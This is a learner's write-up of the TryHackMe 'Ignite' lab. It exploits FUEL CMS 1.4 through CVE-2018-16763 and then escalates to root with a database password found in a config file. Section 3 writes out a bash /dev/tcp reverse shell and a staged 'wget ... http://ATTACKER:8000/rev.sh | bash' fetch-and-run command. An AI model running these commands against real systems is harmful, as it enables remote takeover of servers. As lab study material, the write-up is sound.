# Ignite — TryHackMe — ROOT

**Date:** 2026-09-07
**Platform:** TryHackMe
**Outcome:** user + root
**Time:** ~2h30 (first full CVE-to-RCE chain — everything past recon was new surface)
**Tools:** nmap -A, searchsploit, exploit-db 47138.py (CVE-2018-16763), python3 http.server, nc, pty

---

## 0. TL;DR chain

nmap -A → robots.txt `/fuel/` + "Welcome to FUEL CMS" → page banner: **Version 1.4** →
`searchsploit fuel` → **47138.py, CVE-2018-16763 RCE (1.4.1)** → Python 2→3 fix →
pseudo-shell → staged reverse shell (serve, don't type) → nc + pty upgrade → www-data →
generic privesc sweep empty → **`fuel/application/config/database.php`** → root/mememe →
`su root` → flag

## 1. Recon

One open port, but `-A` extracted the two facts that matter:

| Finding | Source | Means |
|---|---|---|
| `http-robots.txt: /fuel/` | nmap script | hidden app path handed to us |
| `http-title: Welcome to FUEL CMS` | nmap script | product named before any browsing |
| **Version 1.4** | front-page banner | the CVE selector |

Version-reading note: the raw HTML also contains `version="1.1"` — that's the SVG markup
language version inside the logo icon, not the product. **Plain-text sentences announce the
product; attributes belong to their tag.**

## 2. Vulnerability assessment

First instinct (Google "fuel cms cve") returned blind-SQLi CVEs for **1.4.8 / 1.4.13** — later
releases than this box, and from 2021 on a 2016-vintage stack (Apache 2.4.18 / Ubuntu 16.04).
Dead end, walked honestly, logged.

The professional path: `searchsploit fuel` → one RCE family, **1.4.1, CVE-2018-16763**, three
independent exploits. Version logic: the banner says 1.4 (family), the only exploitable entry
is 1.4.1, the box is built to be beaten → hypothesis "1.4.1 with truncated banner". The
exploit landing a shell is the confirmation. *Hypothesis → test → answer key.*

## 3. Foothold (user)

1. **Did:** `searchsploit -m linux/webapps/47138.py`, then **read it before running**:
   `url = "http://<target>"` is the only line to edit; the payload is URL-encoded PHP that runs
   `system(...)` through `/fuel/pages/select/?filter=` — CVE-2018-16763 in one string.

2. **Did:** Python 2 → 3 conversion pass (the script is from 2019):
   `print x` → `print(x)`, `raw_input` → `input`, `urllib.quote` → `urllib.parse.quote`
   (found with Ctrl+W in nano — the line is too long to eyeball). Also dropped the author's
   Burp proxy line: `requests.get(burp0_url)`.
   **Rule: vintage exploit → expect the py2→3 pass before anything else.**

3. **Did:** ran it → interactive `cmd:` pseudo-shell as www-data. Output is the first line;
   the PHP warning HTML after it is the injection's exhaust — evidence, not junk (it even names
   the vulnerable file, Pages.php:924).

4. **Did:** reverse shell. Hand-typed `bash -i >& /dev/tcp/...` and the PHP variant both failed —
   payloads pasted/copied through the browser arrive HTML-corrupted (`&gt;` for `>`), twice.
   The fix that removed every unreliable layer — **serve, don't type**:
   - local: `rev.sh` containing the bash one-liner, `python3 -m http.server 8000`, `nc -lvnp 4444`
   - target: `wget -qO- http://ATTACKER:8000/rev.sh | bash` — zero special characters to corrupt
   **Result:** real shell in netcat. Then TTY: `python -c 'import pty; pty.spawn("/bin/bash")'`.

## 4. Privilege escalation (root)

1. **Did:** opening triple. `sudo -l` wants www-data's (nonexistent) password — dead end.
   SUID sweep: all stock. Crontab: stock. PATH: clean. Capabilities: boring.
   A proper, complete negative sweep.

2. **Did:** applied the principle — **when generic enumeration comes up empty, enumerate the
   application.** As www-data, the CMS's own config is readable:
   `cat /var/www/html/fuel/application/config/database.php` →
   `'username' => 'root', 'password' => 'mememe'` — plaintext, as always.

3. **Did:** the EasyCTF rule — every password gets tried at every prompt:
   `su root` + `mememe` → root. Flag read.

## 5. Misses and dead ends

- **Version guessed before it was read**: picked 1.4.13 because it was "common on the internet"
  and chased a 2021 SQLi CVE that never applied. The banner was one curl away.
- **Windows privesc checklist on a Linux box** (`whoami /priv`, `C:\Unattend.xml`…) — second
  wrong-platform document this week after the IBM i FTP page. Rule: every reference gets
  "what system is this for?" before use.
- **Paste corruption twice** (`&gt;&amp;` payloads) — rule written: payloads with `> < & |` get
  hand-typed or staged via HTTP, never pasted from a browser.
- Jumped to the fallback payload without running the isolation test (echo → /dev/tcp) first —
  debug one variable at a time.
- The config-file privesc needed a nudge despite the PHP error literally printing the path.

## 6. Lessons

1. **CVE selection is evidence work:** version family from the page, era from the stack,
   candidates from searchsploit — and the exploit run is the hypothesis test.
2. **Vintage exploits need a conversion pass** (print, raw_input, urllib.parse) and a read
   before a run.
3. **When generic privesc is empty, the application is the attack surface** — config files hold
   credentials, and every found password gets tried at every prompt.
